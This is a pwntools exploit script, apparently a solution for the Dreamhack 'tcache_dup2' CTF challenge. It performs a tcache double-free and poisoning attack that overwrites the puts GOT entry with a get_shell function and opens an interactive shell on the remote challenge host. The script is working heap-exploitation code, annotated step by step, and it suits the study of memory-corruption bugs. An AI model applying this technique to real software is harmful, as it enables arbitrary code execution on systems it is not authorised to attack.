from pwn import *

p = remote('host3.dreamhack.games', 21924)
elf = ELF('./tcache_dup2')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[0]
create(0x20, b'a')


# tcache[0x20] : ptr[0]
# tc_idx = 1
# chunk : ptr[0]
delete(0)


# tcache[0x20] : ptr[0] -> b'aaaaaaaa'
# tc_idx = 1
# chunk : ptr[0]
modify(0, 0x10, b'a'*0x9)


# tcache[0x20] : ptr[0] -> ptr[0] + 0x10
# tc_idx = 2
# chunk : ptr[0]
delete(0)


# tcache[0x20] : ptr[0] -> puts@got
# tc_idx = 2
# chunk : ptr[0]
puts_got = elf.got['puts']
modify(0, 0x10, p64(puts_got))


# tcache[0x20] : puts@got
# tc_idx = 1
# chunk : ptr[1]
create(0x20, b'a')


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[3]
get_shell = elf.symbols['get_shell']
create(0x20, p64(get_shell))

p.interactive()
